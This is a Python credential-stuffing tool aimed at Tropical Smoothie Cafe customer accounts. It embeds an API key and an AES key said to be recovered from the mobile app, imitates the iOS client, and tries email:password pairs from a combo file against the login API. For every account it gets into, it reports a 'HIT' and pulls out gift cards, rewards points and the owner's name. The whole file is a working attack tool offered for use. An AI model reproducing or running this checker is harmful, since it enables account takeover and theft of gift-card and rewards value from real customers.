#!/usr/bin/env python3
"""Tropical Smoothie Cafe account checker.

Logs in via the mobile API, then fetches gift cards and rewards balance.
Password encryption recovered from the Android app bundle (CryptoJS AES-128-CBC).
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import uuid
from dataclasses import dataclass, field
from typing import Any

import urllib.error
import urllib.request

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

API_BASE = "https://global.tropicalsmoothiecafeapi.com"
API_KEY = "8bklk8bl1k3sB38D9B3l0enyTSC8c09B30lkq0cafe"
AES_KEY = b"aesEncryptionTSC"
AES_IV = b"encryptionIntVec"
USER_AGENT = "Tropical Smoothie Cafe/6.8.20/3268 (iPhone; iOS 26.6.2; Scale/3.00)"
DEVICE_TOKEN = "0" * 64


def aes_encrypt(plaintext: str) -> str:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    ciphertext = cipher.encrypt(pad(plaintext.encode("utf-8"), 16))
    return base64.b64encode(ciphertext).decode()


@dataclass
class AccountResult:
    email: str
    success: bool
    message: str = ""
    status_code: int | None = None
    punchh_token: str | None = None
    olo_token: str | None = None
    gift_cards: list[dict[str, Any]] = field(default_factory=list)
    points: int | None = None
    rewards: list[dict[str, Any]] = field(default_factory=list)
    profile: dict[str, Any] | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "email": self.email,
            "success": self.success,
            "message": self.message,
            "status_code": self.status_code,
            "points": self.points,
            "gift_cards": self.gift_cards,
            "rewards": [
                {
                    "name": r.get("name"),
                    "expiring_at": r.get("expiring_at"),
                }
                for r in self.rewards
            ],
            "profile": self.profile,
        }


class TSCClient:
    def __init__(self, device_id: str | None = None) -> None:
        self.device_id = device_id or str(uuid.uuid4()).upper()

    def _request(
        self,
        method: str,
        path: str,
        body: dict[str, Any] | None = None,
        auth: dict[str, str] | None = None,
    ) -> dict[str, Any]:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "client-type": "ios",
            "device-id": self.device_id,
            "Accept-Language": "en-US,en;q=0.9",
            "x-api-key": API_KEY,
            "Content-Type": "application/json",
            "User-Agent": USER_AGENT,
        }
        if auth:
            headers.update(auth)

        data = None
        if body is not None:
            data = json.dumps(body).encode()

        req = urllib.request.Request(
            f"{API_BASE}{path}",
            data=data,
            headers=headers,
            method=method,
        )
        with urllib.request.urlopen(req, timeout=30) as resp:
            return json.loads(resp.read().decode())

    def login(self, email: str, password: str) -> dict[str, Any]:
        return self._request(
            "POST",
            "/v1/profile/auth/login",
            {
                "email": email,
                "password": aes_encrypt(password),
                "device_token": DEVICE_TOKEN,
            },
        )

    def get_gift_cards(self, email: str, punchh: str, olo: str) -> dict[str, Any]:
        return self._request(
            "GET",
            "/v1/payment/giftcards",
            auth=self._auth_headers(email, punchh, olo),
        )

    def get_balance(self, email: str, punchh: str, olo: str) -> dict[str, Any]:
        return self._request(
            "GET",
            "/v1/profile/auth/fetch_user_balance",
            auth=self._auth_headers(email, punchh, olo),
        )

    def get_profile(self, email: str, punchh: str, olo: str) -> dict[str, Any]:
        return self._request(
            "GET",
            "/v1/profile/auth/user",
            auth=self._auth_headers(email, punchh, olo),
        )

    @staticmethod
    def _auth_headers(email: str, punchh: str, olo: str) -> dict[str, str]:
        return {
            "email-id": email,
            "Authorization": f"Bearer {punchh}, Bearer {olo}",
            "punchh-authorization": f"Bearer {punchh}",
            "olo-authorization": f"Bearer {olo}",
        }


def check_account(email: str, password: str, device_id: str | None = None) -> AccountResult:
    client = TSCClient(device_id=device_id)
    result = AccountResult(email=email, success=False)

    try:
        login_resp = client.login(email, password)
    except urllib.error.HTTPError as exc:
        body = exc.read().decode(errors="replace")
        result.message = f"HTTP {exc.code}: {body}"
        return result
    except urllib.error.URLError as exc:
        result.message = f"Network error: {exc.reason}"
        return result

    result.status_code = login_resp.get("statusCode")
    result.message = login_resp.get("message", "")

    if login_resp.get("status") != "Success":
        return result

    data = login_resp.get("data") or {}
    punchh = ((data.get("access_token") or {}).get("token")) or ""
    olo = data.get("oloToken") or data.get("olo_access_token") or ""

    if not punchh:
        result.message = "Login succeeded but no access token returned"
        return result

    result.success = True
    result.punchh_token = punchh
    result.olo_token = olo or None

    try:
        gift_resp = client.get_gift_cards(email, punchh, olo)
        if gift_resp.get("status") == "Success":
            result.gift_cards = gift_resp.get("data") or []
    except urllib.error.URLError as exc:
        result.message += f"; gift card fetch failed: {exc.reason}"

    try:
        bal_resp = client.get_balance(email, punchh, olo)
        if bal_resp.get("status") == "Success":
            bal_data = bal_resp.get("data") or {}
            account_balance = bal_data.get("account_balance") or {}
            result.points = account_balance.get("redeemable_points")
            result.rewards = bal_data.get("rewards") or []
    except urllib.error.URLError:
        pass

    try:
        profile_resp = client.get_profile(email, punchh, olo)
        if profile_resp.get("status") == "Success":
            user = (profile_resp.get("data") or {}).get("user") or {}
            result.profile = {
                "first_name": user.get("first_name"),
                "last_name": user.get("last_name"),
                "referral_code": user.get("referral_code"),
            }
    except urllib.error.URLError:
        pass

    return result


def parse_combo_line(line: str) -> tuple[str, str] | None:
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if ":" not in line:
        return None
    email, password = line.split(":", 1)
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return None
    return email, password


def format_hit(result: AccountResult) -> str:
    parts = [f"HIT {result.email}"]
    if result.profile:
        name = " ".join(
            x for x in [result.profile.get("first_name"), result.profile.get("last_name")] if x
        )
        if name:
            parts.append(f"name={name}")
    if result.points is not None:
        parts.append(f"points={result.points}")
    parts.append(f"gift_cards={len(result.gift_cards)}")
    if result.gift_cards:
        for card in result.gift_cards:
            parts.append(json.dumps(card, separators=(",", ":")))
    if result.rewards:
        parts.append(f"rewards={len(result.rewards)}")
    return " | ".join(parts)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Check Tropical Smoothie Cafe accounts")
    parser.add_argument("combo", nargs="?", help="email:password or path to combo file")
    parser.add_argument("--json", action="store_true", help="Print JSON output")
    parser.add_argument("--device-id", help="Fixed device-id UUID")
    args = parser.parse_args(argv)

    if not args.combo:
        parser.error("Provide email:password or a combo file path")

    combos: list[tuple[str, str]] = []
    if ":" in args.combo and "\n" not in args.combo and not args.combo.endswith(".txt"):
        parsed = parse_combo_line(args.combo)
        if parsed:
            combos.append(parsed)
    else:
        with open(args.combo, encoding="utf-8") as fh:
            for line in fh:
                parsed = parse_combo_line(line)
                if parsed:
                    combos.append(parsed)

    if not combos:
        print("No valid email:password combos found", file=sys.stderr)
        return 1

    hits = 0
    for email, password in combos:
        result = check_account(email, password, device_id=args.device_id)
        if args.json:
            print(json.dumps(result.to_dict(), indent=2))
        elif result.success:
            hits += 1
            print(format_hit(result))
        else:
            print(f"FAIL {email} | {result.message} (code={result.status_code})")

    return 0 if hits or args.json else 2


if __name__ == "__main__":
    raise SystemExit(main())
